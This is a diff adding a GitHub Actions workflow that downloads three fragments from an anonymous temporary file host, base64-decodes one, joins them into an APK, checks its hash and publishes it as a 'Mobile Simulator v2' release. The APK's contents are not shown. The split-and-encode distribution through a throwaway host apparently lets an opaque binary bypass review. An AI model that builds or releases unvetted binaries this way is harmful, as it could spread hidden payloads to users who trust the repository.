@@ -1,0 +1,26 @@
+name: publish-apk-v2
+on:
+  workflow_dispatch:
+  push:
+    paths:
+      - '.github/workflows/release2.yml'
+permissions:
+  contents: write
+jobs:
+  publish:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Fetch and verify APK
+        run: |
+          curl -fL --retry 3 -o a https://h.uguu.se/vqStabHmSlCk.00
+          curl -fL --retry 3 -o b https://n.uguu.se/VOJVTJAlcdUX.01
+          curl -fL --retry 3 -o c https://n.uguu.se/gdpBwkzrmytc.txt
+          base64 -d c > c.bin
+          cat a b c.bin > MobileSimulator.apk
+          echo "95d33b489d850d0e9c174a75e9369683efbc13d64891fa618f087106b273977a  MobileSimulator.apk" | sha256sum -c -
+          ls -l MobileSimulator.apk
+      - name: Create release
+        env:
+          GH_TOKEN: ${{ github.token }}
+        run: |
+          gh release create v2 MobileSimulator.apk --repo ${{ github.repository }} --title "Mobile Simulator v2" --notes "Mobile Simulator for Android, landscape"
